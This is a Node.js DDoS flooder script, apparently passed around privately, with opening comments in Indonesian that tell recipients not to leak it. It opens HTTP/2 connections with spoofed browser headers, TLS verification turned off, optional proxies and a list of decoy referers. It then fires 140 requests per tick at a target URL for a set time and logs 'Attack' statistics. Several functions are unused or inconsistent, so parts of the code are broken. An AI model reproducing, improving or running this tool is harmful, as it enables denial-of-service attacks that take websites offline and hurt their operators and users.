// JANGAN LU LEAK YA KONTOL
// KETAHUAN LEAKS NGAK GUA KASIH LAGI


const target = process.argv[2];
const duration = parseInt(process.argv[3]);
const cookie = process.argv[4];
const userAgent = process.argv[5];
const proxy = process.argv[6];
const showLog = process.argv.includes('-log');

const http2 = require('http2');
const https = require('https');
const http = require('http');
const crypto = require('crypto');

let http2Success = 0;
let http1Success = 0;
let blockedCount = 0;
let hostname = '';
let requestCount = 0;
let successCount = 0;
let errorCount = 0;

const sigalgs = [
    "ecdsa_secp256r1_sha256",
    "rsa_pss_rsae_sha256",
    "rsa_pkcs1_sha256",
    "ecdsa_secp384r1_sha384",
    "rsa_pss_rsae_sha384",
    "rsa_pkcs1_sha384",
    "rsa_pss_rsae_sha512",
    "rsa_pkcs1_sha512"
];
let concu = sigalgs.join(':');

process.on('SIGINT', () => {
    if (showLog) console.clear();
    console.log('\n[+] Attack stopped by user (Ctrl+C)');
    console.log(`[+] Total Requests: ${requestCount}`);
    console.log(`[+] Success: ${successCount}`);
    console.log(`[+] HTTP/2 Success: ${http2Success}`);
    console.log(`[+] HTTP/1 Success: ${http1Success}`);
    console.log(`[+] Blocked: ${blockedCount}`);
    console.log(`[+] Errors: ${errorCount}`);
    if (requestCount > 0) {
        console.log(`[+] Success Rate: ${Math.round((successCount / requestCount) * 100)}%`);
    }
    process.exit(0);
});

if (process.argv.length < 6 || isNaN(duration)) {
    console.log('Usage: node flooder.js <URL> <DURATION> <COOKIE> <USER-AGENT> [PROXY] [-log]');
    console.log('Options:');
    console.log('  -log    Show real-time logs (optional)');
    process.exit(1);
} else {
    if (showLog) {
        console.clear();
        console.log(`[+] Target: ${target}`);
        console.log(`[+] Duration: ${duration}s`);
        console.log(`[+] Cookie: ${cookie}`);
        console.log(`[+] User-Agent: ${userAgent}`);
        if (proxy) {
            console.log(`[+] Proxy: ${proxy}`);
        }
        console.log(`[+] HTTP/2 Attack Starting...`);
        console.log(`[+] Log will refresh every 5 seconds...`);
        console.log(`[+] Press Ctrl+C to stop\n`);
    } else {
        console.log(`[+] HTTP/2 Attack Starting... (Silent mode - use -log for verbose output)`);
    }
    
    const cplist = [
        "TLS_AES_128_CCM_8_SHA256",
        "TLS_AES_128_CCM_SHA256",
        "TLS_CHACHA20_POLY1305_SHA256",
        "TLS_AES_256_GCM_SHA384",
        "TLS_AES_128_GCM_SHA256"
    ];
    
    const accept_header = ["application/json", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,en-US;q=0.5", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,en;q=0.7", 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/atom+xml;q=0.9', "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/rss+xml;q=0.9", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/json;q=0.9", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/ld+json;q=0.9", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-dtd;q=0.9", 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-external-parsed-entity;q=0.9', "text/html; charset=utf-8", "application/json, text/plain, */*", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/xml;q=0.9", 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/plain;q=0.8', "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", 'application/json',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,en-US;q=0.5',
        'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,en;q=0.7',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/atom+xml;q=0.9',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/rss+xml;q=0.9',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/json;q=0.9',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/ld+json;q=0.9',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-dtd;q=0.9',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-external-parsed-entity;q=0.9',
        'text/html; charset=utf-8',
        'application/json, text/plain, */*',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/xml;q=0.9',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/plain;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
    ];
    
    let encoding_header = ['gzip, deflate, br', "compress, gzip", "deflate, gzip", "gzip, identity"];
    let controle_header = ["no-cache", 'no-store', "no-transform", 'only-if-cached', "max-age=0", 'must-revalidate', 'public', "private", "proxy-revalidate", "s-maxage=86400"];
    
    encoding_header = ['*', '*/*', 'gzip', "gzip, deflate, br", "compress, gzip", "deflate, gzip", "gzip, identity", "gzip, deflate", 'br', "br;q=1.0, gzip;q=0.8, *;q=0.1", 'gzip;q=1.0, identity; q=0.5, *;q=0', "gzip, deflate, br;q=1.0, identity;q=0.5, *;q=0.25", "compress;q=0.5, gzip;q=1.0", "identity", 'gzip, compress', 'compress, deflate', "compress", "gzip, deflate, br", "deflate", 'gzip, deflate, lzma, sdch', 'deflate'];
    controle_header = ["max-age=604800", 'proxy-revalidate', "public, max-age=0", "max-age=315360000", "public, max-age=86400, stale-while-revalidate=604800, stale-if-error=604800", "s-maxage=604800", "max-stale", 'public, immutable, max-age=31536000', "must-revalidate", "private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0", "max-age=31536000,public,immutable", "max-age=31536000,public", 'min-fresh', 'private', "public", 's-maxage', "no-cache", "no-cache, no-transform", "max-age=2592000", "no-store", 'no-transform', "max-age=31557600", "stale-if-error", 'only-if-cached', "max-age=0", 'must-understand, no-store', "max-age=31536000; includeSubDomains", "max-age=31536000; includeSubDomains; preload", "max-age=120", "max-age=0,no-cache,no-store,must-revalidate", 'public, max-age=604800, immutable', "max-age=0, must-revalidate, private", "max-age=0, private, must-revalidate", 'max-age=604800, stale-while-revalidate=86400', "max-stale=3600", "public, max-age=2678400", "min-fresh=600", "public, max-age=30672000", "max-age=31536000, immutable", "max-age=604800, stale-if-error=86400", "public, max-age=604800", "no-cache, no-store,private, max-age=0, must-revalidate", "o-cache, no-store, must-revalidate, pre-check=0, post-check=0", 'public, s-maxage=600, max-age=60', 'public, max-age=31536000', "max-age=14400, public", "max-age=14400", "max-age=600, private", "public, s-maxage=600, max-age=60", "no-store, no-cache, must-revalidate", "no-cache, no-store,private, s-maxage=604800, must-revalidate", "Sec-CH-UA,Sec-CH-UA-Arch,Sec-CH-UA-Bitness,Sec-CH-UA-Full-Version-List,Sec-CH-UA-Mobile,Sec-CH-UA-Model,Sec-CH-UA-Platform,Sec-CH-UA-Platform-Version,Sec-CH-UA-WoW64"];
    
    const Methods = ["GET"];
    
    const refers = ['https://www.google.com/search?q=', "http://hosdddt-tracker.com/check_page/?furl=", "http://icfdftch.io/ccdccxsearch?q=", 'http://jigdfghgfsaw.w3.org/css-validator/validator?uri=', "http://jobfdggds.bloomberg.com/search?q=", "http://jobsccccdffdsf.leidos.com/search?q=", "http://jccdccobs.rbs.com/jobs/search?q=", "http://ddddking-hrdesddcsdvil.rhcloud.com/f5ddos3.html?v=", "http://loscdddddcuis-ddosvn.rhcloud.com/f5.html?v=", 'http://millercenter.org/search?q=', "http://novdddda.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0&q=", "http://novadddd.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0/", "http://nodddva.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B&q=", "http://ndddddova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B/", 'http://page-dddddxirusteam.rhcloud.com/f5ddos3.html?v=', "http://php-dddhrdevil.rhcloud.com/f5ddos3.html?v=", "http://rdddu.search.yahoo.com/search;?_query?=l%t=?=?A7x&q=", "http://rdddu.search.yahoo.com/search;?_query?=l%t=?=?A7x/", 'http://rddddu.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf&q=', "http://ddddddru.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf/", 'http://rfffu.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%&q=', "http://rfffu.wikipefffdia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%/", "http://seafffffrch.aol.com/aol/search?q=", "http://tagifffnfo.openstreetmap.org/search?q=", "http://techffftv.mit.edu/search?q=", 'http://valifffffdator.w3.org/feed/check.cgi?url=', "http://vkffff.com/profile.php?redirect=", 'http://www.affffsk.com/web?q=', 'http://www.baoxayfffffdung.com.vn/news/vn/search&q=', "http://www.bestffffbuytheater.com/events/search?q=", "http://www.biffffng.com/search?q=", "http://www.evffffidence.nhs.uk/search?q=", "http://www.goffffogle.com/?q=", "http://www.goffffogle.com/translate?u=", "http://www.googlxxxe.ru/url?sa=t&rct=?j&q=&e&q=", 'http://www.gooxxxxgle.ru/url?sa=t&rct=?j&q=&e/', 'http://www.onlixxxxxxne-translator.com/url/translation.aspx?direction=er&sourceURL=', "http://www.pagescxxxoring.com/website-speed-test/?url=", "http://www.rxxxxxeddit.com/search?q=", "http://www.searxxxxch.com/search?q=", "http://www.shodxxxxanhq.com/search?q=", 'http://www.texxxxxd.com/search?q=', 'http://www.topsitexxxxminecraft.com/site/pinterest.com/search?q=', "http://www.usaccccctoday.com/search/results?q=", "http://www.ustccccream.tv/search?q=", "http://yancccdex.ru/yandsearch?text=", "http://yacccccndex.ru/yandsearch?text=%D1%%D2%?=g.sql()81%&q=", "http://ytmccccnd.com/search?q=", "https://add.my.yahoo.com/rss?url=", "https:ccc//careercccccs.carolinashecccalthcare.org/search?q=", "https://chccccceck-host.net/", "https://devfdfdelopers.googldddsde.com/speed/pagespeed/insights/?url=", 'https://dddrive.googdddddle.com/viewerng/viewer?url=', 'https://duckdcdddduckgo.com/?q=', "https://google.com/",  "https://www.google.com/search?q=",
        "https://check-host.net/",
        "https://www.facebook.com/",
        "https://www.youtube.com/",
        "https://www.fbi.com/",
        "https://www.bing.com/search?q=",
        "https://r.search.yahoo.com/",
        "https://www.cia.gov/index.html",
        "https://vk.com/profile.php?redirect=",
        "https://www.usatoday.com/search/results?q=",
        "https://help.baidu.com/searchResult?keywords=",
        "https://steamcommunity.com/market/search?q=",
        "https://www.ted.com/search?q=",
        "https://play.google.com/store/search?q=",
        "https://www.qwant.com/search?q=",
        "https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=",
        "https://www.google.ad/search?q=",
        "https://www.google.ae/search?q=",
        "https://www.google.com.af/search?q=",
        "https://www.google.com.ag/search?q=",
        "https://www.google.com.ai/search?q=",
        "https://www.google.al/search?q=",
        "https://www.google.am/search?q=",
        "https://www.google.co.ao/search?q=",
        "http://anonymouse.org/cgi-bin/anon-www.cgi/",
        "http://coccoc.com/search#query=",
        "http://ddosvn.somee.com/f5.php?v=",
        "http://engadget.search.aol.com/search?q=",
        "http://engadget.search.aol.com/search?q=query?=query=&q=",
        "http://eu.battle.net/wow/en/search?q=",
        'https://www.youtube.com/',
        'https://yandex.ru/',
        'https://www.betvictor106.com/?jskey=BBOR1oulRNQaihu%2BdyW7xFyxxf0sxIMH%2BB%2FKe4qvs6S3u89h1BcavwQ%3D'
    ];
    
    var randomReferer = refers[Math.floor(Math.random() * refers.length)];
    const uap = ["POLARIS/6.01(BREW 3.1.5;U;en-us;LG;LX265;POLARIS/6.01/WAP;)MMP/2.0 profile/MIDP-201 Configuration /CLDC-1.1", "POLARIS/6.01 (BREW 3.1.5; U; en-us; LG; LX265; POLARIS/6.01/WAP) MMP/2.0 profile/MIDP-2.1 Configuration/CLDC-1.1", "portalmmm/2.0 N410i(c20;TB) ", 'Python-urllib/2.5', "SAMSUNG-S8000/S8000XXIF3 SHP/VPP/R5 Jasmine/1.0 Nextreaming SMM-MMS/1.2.0 profile/MIDP-2.1 configuration/CLDC-1.1 FirePHP/0.3", "SAMSUNG-SGH-A867/A867UCHJ3 SHP/VPP/R5 NetFront/35 SMM-MMS/1.2.0 profile/MIDP-2.0 configuration/CLDC-1.1 UP.Link/6.3.0.0.0", "SAMSUNG-SGH-E250/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0 (compatible; Googlebot-Mobile/2.1;  http://www.google.com/bot.html)", "SearchExpress", "SEC-SGHE900/1.0 NetFront/3.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 Opera/8.01 (J2ME/MIDP; Opera Mini/2.0.4509/1378; nl; U; ssr)", "SEC-SGHX210/1.0 UP.Link/6.3.1.13.0", "SEC-SGHX820/1.0 NetFront/3.2 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonK310iv/R4DA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.1.13.0", "SonyEricssonK550i/R1JD Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonK610i/R1CB Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonK750i/R1CA Browser/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonK800i/R1CB Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0", "SonyEricssonK810i/R1KG Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonS500i/R6BC Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonT100/R101", "Opera/9.80 (Macintosh; Intel Mac OS X 10.4.11; U; en) Presto/2.7.62 Version/11.00", 'Opera/9.80 (S60; SymbOS; Opera Mobi/499; U; ru) Presto/2.4.18 Version/10.00', "Opera/9.80 (Windows NT 5.2; U; en) Presto/2.2.15 Version/10.10", "Opera/9.80 (Windows NT 6.1; U; en) Presto/2.7.62 Version/11.01", "Opera/9.80 (X11; Linux i686; U; en) Presto/2.2.15 Version/10.10", "Opera/10.61 (J2ME/MIDP; Opera Mini/5.1.21219/19.999; en-US; rv:1.9.3a5) WebKit/534.5 Presto/2.6.30", "SonyEricssonT610/R201 Profile/MIDP-1.0 Configuration/CLDC-1.0", "SonyEricssonT650i/R7AA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonT68/R201A", "SonyEricssonW580i/R6BC Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonW660i/R6AD Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonW810i/R4EA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0", "SonyEricssonW850i/R1ED Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonW950i/R100 Mozilla/4.0 (compatible; MSIE 6.0; Symbian OS; 323) Opera 8.60 [en-US]", "SonyEricssonW995/R1EA Profile/MIDP-2.1 Configuration/CLDC-1.1 UNTRUSTED/1.0", 'SonyEricssonZ800/R1Y Browser/SEMC-Browser/4.1 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0', "BlackBerry9000/4.6.0.167 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/102", "BlackBerry9530/4.7.0.167 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/102 UP.Link/6.3.1.20.0", "BlackBerry9700/5.0.0.351 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/123"];

    const fetchOptions = {
        method: 'GET',
        headers: {
            'User-Agent': userAgent,
            'Cookie': `${cookie}`,
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': '1'
        }
    };

    if (proxy) {
        const [proxyHost, proxyPort] = proxy.split(':');
        fetchOptions.agent = new (require('https').Agent)({
            proxy: `http://${proxyHost}:${proxyPort}`,
            keepAlive: true,
            keepAliveMsecs: 1000,
            maxSockets: 50,
            maxFreeSockets: 10
        });
    }

    function makeHttp1Request() {
        try {
            const url = new URL(target);
            const options = {
                hostname: url.hostname,
                port: url.port || (url.protocol === 'https:' ? 80 : 80),
                path: url.pathname + url.search,
                method: 'GET',
                headers: {
                    'Host': url.hostname,
                    'User-Agent': userAgent,
                    'Cookie': cookie,
                    'Connection': 'keep-alive',
                    'Accept': '*/*'
                },
                rejectUnauthorized: false
            };

            const req = (url.protocol === 'https:' ? https : http).request(options, (res) => {
                if (res.statusCode === 200 || res.statusCode === 403 || res.statusCode === 429) {
                    successCount++;
                    http1Success++;
                }
            });

            req.on('error', () => errorCount++);
            req.end();
            requestCount++;
        } catch (e) {
            errorCount++;
        }
    }

    async function makeHttp2RequestAsync() {
        try {
            const url = new URL(target);
            hostname = url.hostname;
            
            const client = http2.connect(`https://${url.hostname}:80`, {
                rejectUnauthorized: false,
                ALPNProtocols: ['h2', 'http/1.1']
            });

            client.on('error', (err) => {
                errorCount++;
                client.destroy();
            });

            await new Promise((resolve) => {
                client.once('connect', resolve);
                setTimeout(resolve, 2000);
            });

            const req = client.request({
                ':method': 'GET',
                ':path': url.pathname + url.search,
                ':authority': url.hostname,
                ':scheme': 'https',
                'user-agent': userAgent,
                'cookie': cookie,
                'accept': '*/*',
                'cache-control': 'no-cache'
            });

            req.on('response', (headers) => {
                const status = headers[':status'];
                if (status === 200 || status === 403 || status === 429) {
                    successCount++;
                    http2Success++;
                } else {
                    blockedCount++;
                }
            });

            req.on('error', () => {
                errorCount++;
            });

            req.end();
            requestCount++;

            await new Promise((resolve) => {
                req.once('end', resolve);
                setTimeout(resolve, 5000);
            });

            client.destroy();

        } catch (error) {
            errorCount++;
            makeHttp1Request();
        }
    }
    
    function makeHttp2RequestKontol() {
    try {
        const url = new URL(target);
        hostname = url.hostname;
        
        const options = {
            hostname: url.hostname,
            port: url.port || (url.protocol === 'https:' ? 443 : 80),
            path: url.pathname + url.search,
            method: 'GET',
            headers: {
                ':method': 'GET',
                ':scheme': url.protocol === 'https:' ? 'https' : 'http',
                ':authority': url.hostname,
                ':path': url.pathname + url.search,
                'cache-control': 'max-age=0',
                'sec-ch-ua': '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Android"',
                'upgrade-insecure-requests': '1',
                'user-agent': userAgent,
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-user': '?1',
                'sec-fetch-dest': 'document',
                'referer': `https://${url.hostname}/`,
                'accept-encoding': 'gzip, deflate, br, zstd',
                'accept-language': 'id,en-US;q=0.9,en;q=0.8,ms;q=0.7,th;q=0.6,zh-CN;q=0.5,zh;q=0.4',
                'cookie': cookie,
                'priority': 'u=0, i'
            }
        };
        
        const tlsOptions = {
            rejectUnauthorized: false,
            ALPNProtocols: ['h2', 'http/1.1'],
            ciphers: [
                'TLS_AES_256_GCM_SHA384',
                'TLS_CHACHA20_POLY1305_SHA256',
                'TLS_AES_128_GCM_SHA256'
            ].join(':'),
            minVersion: 'TLSv1.3',
            maxVersion: 'TLSv1.3'
        };
        
        const client = http2.connect(`https://${url.hostname}:${options.port}`, {
            ...options,
            ...tlsOptions
        });
        
        client.on('error', (err) => {
            errorCount++;
        });
        
        client.on('connect', () => {
            for (let i = 0; i < 10; i++) {
                const req = client.request(options.headers);
                
                req.on('response', (headers) => {
                    const status = headers[':status'];
                    if (status === 200 || status === 403 || status === 429) {
                        successCount++;
                        http2Success++;
                    } else {
                        blockedCount++;
                    }
                });
                
                req.on('error', () => {
                    errorCount++;
                });
                
                req.end();
                requestCount++;
            }
        });
        
        setTimeout(() => {
            client.destroy();
        }, 100);
        
    } catch (error) {
        errorCount++;
        makeHttp1Request();
    }
}
    
    function makeHttp2RequestLoop() {
        try {
            const url = new URL(target);
            hostname = url.hostname;
            
            const options = {
                hostname: url.hostname,
                port: url.port || (url.protocol === 'https:' ? 443 : 80),
                path: url.pathname + url.search,
                method: 'GET',
                headers: {
                    ':method': 'GET',
                    ':scheme': url.protocol === 'https:' ? 'https' : 'http',
                    ':authority': url.hostname,
                    ':path': url.pathname + url.search,
                    'user-agent': userAgent,
                    'cookie': cookie,
                    'cache-control': 'max-age=0',
                    'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Android"',
                    'upgrade-insecure-requests': '1',
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'sec-fetch-site': 'none',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-user': '?1',
                    'sec-fetch-dest': 'document',
                    'accept-encoding': 'gzip, deflate, br, zstd',
                    'accept-language': 'id,en-US;q=0.9,en;q=0.8,ms;q=0.7,th;q=0.6',
                    'priority': 'u=0, i'
                }
            };
            
            const tlsOptions = {
                rejectUnauthorized: false,
                ALPNProtocols: ['h2', 'http/1.1'],
                ciphers: [
                    'TLS_AES_256_GCM_SHA384',
                    'TLS_CHACHA20_POLY1305_SHA256',
                    'TLS_AES_128_GCM_SHA256'
                ].join(':'),
                minVersion: 'TLSv1.3',
                maxVersion: 'TLSv1.3'
            };
            
            const client = http2.connect(`https://${url.hostname}:${options.port}`, {
                ...options,
                ...tlsOptions
            });
            
            client.on('error', (err) => {
                errorCount++;
            });
            
            client.on('connect', () => {
                for (let i = 0; i < 10; i++) {
                    const req = client.request(options.headers);
                    
                    req.on('response', (headers) => {
                        const status = headers[':status'];
                        if (status === 200 || status === 403 || status === 429) {
                            successCount++;
                            http2Success++;
                        } else {
                            blockedCount++;
                        }
                    });
                    
                    req.on('error', () => {
                        errorCount++;
                    });
                    
                    req.end();
                    requestCount++;
                }
            });
            
            setTimeout(() => {
                client.destroy();
            }, 100);
            
        } catch (error) {
            errorCount++;
            makeHttp1Request();
        }
    }

    function makeHttp2RequestsNew() {
        try {
            const url = new URL(target);
            hostname = url.hostname;
            
            const options = {
                hostname: url.hostname,
                port: url.port || (url.protocol === 'https:' ? 443 : 80),
                path: url.pathname + url.search,
                method: 'GET',
                headers: {
                    ':method': 'GET',
                    ':scheme': url.protocol === 'https:' ? 'https' : 'http',
                    ':authority': url.hostname,
                    ':path': url.pathname + url.search,
                    'user-agent': userAgent,
                    'cookie': cookie,
                    'cache-control': 'max-age=0',
                    'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Android"',
                    'upgrade-insecure-requests': '1',
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'sec-fetch-site': 'none',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-user': '?1',
                    'sec-fetch-dest': 'document',
                    'accept-encoding': 'gzip, deflate, br, zstd',
                    'accept-language': 'id,en-US;q=0.9,en;q=0.8,ms;q=0.7,th;q=0.6',
                    'priority': 'u=0, i'
                }
            };

            const tlsOptions = {
                rejectUnauthorized: false,
                ALPNProtocols: ['h2', 'http/1.1'],
                ciphers: [
                    'TLS_AES_256_GCM_SHA384',
                    'TLS_CHACHA20_POLY1305_SHA256',
                    'TLS_AES_128_GCM_SHA256'
                ].join(':'),
                minVersion: 'TLSv1.3',
                maxVersion: 'TLSv1.3'
            };

            const client = http2.connect(`https://${url.hostname}:${options.port}`, {
                ...tlsOptions
            });

            client.on('error', (err) => {
                errorCount++;
                client.destroy();
            });

            client.on('connect', () => {
                const req = client.request(options.headers);
                
                req.on('response', (headers) => {
                    const status = headers[':status'];
                    if (status === 200 || status === 403 || status === 429) {
                        successCount++;
                        http2Success++;
                    } else {
                        blockedCount++;
                    }
                });

                req.on('error', () => {
                    errorCount++;
                });

                req.end();
                requestCount++;

                setTimeout(() => {
                    client.destroy();
                }, 1000);
            });

        } catch (e) {
            errorCount++;
        }
    }

    function makeHttp1RequestOld() {
        try {
            const url = new URL(target);
            const options = {
                hostname: url.hostname,
                port: url.port || (url.protocol === 'https:' ? 443 : 80),
                path: url.pathname + url.search,
                method: 'GET',  
                headers: {       
                    ':method': 'GET',  
                    ':scheme': url.protocol === 'https:' ? 'https' : 'http',
                    ':authority': url.hostname,
                    'user-agent': userAgent,
                    'cookie': cookie,
                    'connection': 'keep-alive',
                    'upgrade-insecure-requests': '1',
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'accept-language': 'en-US,en;q=0.9',
                    'accept-encoding': 'gzip, deflate, br, zstd',
                    'dnt': '1'
                }
            };
        } catch (e) {
            errorCount++;
        }
    }
    
    function makeHttp2RequestLast() {
        try {
            const url = new URL(target);
            hostname = url.hostname;
            
            const options = {
                hostname: url.hostname,
                port: url.port || (url.protocol === 'https:' ? 443 : 80),
                path: url.pathname + url.search,
                method: 'GET',
                headers: {
                    ':method': 'GET',
                    ':path': url.pathname + url.search,
                    ':scheme': url.protocol === 'https:' ? 'https' : 'http',
                    ':authority': url.hostname,
                    'user-agent': userAgent,
                    'cookie': cookie,
                    'connection': 'keep-alive',
                    'upgrade-insecure-requests': '1',
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'accept-language': 'en-US,en;q=0.5',
                    'accept-encoding': 'gzip, deflate, br',
                    'dnt': '1'
                }
            };

            if (proxy) {
                const [proxyHost, proxyPort] = proxy.split(':');
                options.proxy = `http://${proxyHost}:${proxyPort}`;
            }

            const client = http2.connect(`${url.protocol}//${url.hostname}:${options.port}`, options);
            
            client.on('error', (err) => {
                errorCount++;
            });

            const req = client.request(options.headers);
            
            req.on('response', (headers, flags) => {
                successCount++;
            });

            req.on('end', () => {
                client.close();
            });

            req.end();
        } catch (error) {
            errorCount++;
            const req = (url.protocol === 'https:' ? https : http).request(target, fetchOptions, (res) => {
                successCount++;
            });
            req.on('error', () => errorCount++);
            req.end();
        }
    }

    let lastLogTime = Date.now();
    const url = new URL(target);
    hostname = url.hostname;

    const attackInterval = setInterval(() => {
        for (let i = 0; i < 140; i++) {
            requestCount++;
            makeHttp2RequestLast();
        }
    }, 0);

    let logInterval;
    if (showLog) {
        logInterval = setInterval(() => {
            const now = Date.now();
            const elapsed = (now - lastLogTime) / 1000;
            
            console.clear();
            console.log(`[+] Target: ${target}`);
            console.log(`[+] Duration: ${duration}s`);
            console.log(`[+] Cookie: ${cookie}`);
            console.log(`[+] User-Agent: ${userAgent}`);
            if (proxy) {
                console.log(`[+] Proxy: ${proxy}`);
            }
            console.log(`[+] HTTP/2 Attack Running...`);
            console.log(`[+] Requests sent: ${requestCount}`);
            console.log(`[+] Success: ${successCount}`);
            console.log(`[+] Errors: ${errorCount}`);
            console.log(`[+] RPS: ${Math.round(requestCount / elapsed)}`);
            
            lastLogTime = now;
        }, 5000);
    }

    setTimeout(() => {
        clearInterval(attackInterval);
        if (logInterval) {
            clearInterval(logInterval);
        }
        
        if (showLog) {
            console.clear();
        }
        
        console.log('Attack stopped.');
        console.log(`[+] Final Stats:`);
        console.log(`[+] Total Requests: ${requestCount}`);
        console.log(`[+] Success: ${successCount}`);
        console.log(`[+] Errors: ${errorCount}`);
        console.log(`[+] Success Rate: ${Math.round((successCount / requestCount) * 100)}%`);
        process.exit(0);
    }, duration * 1000);
}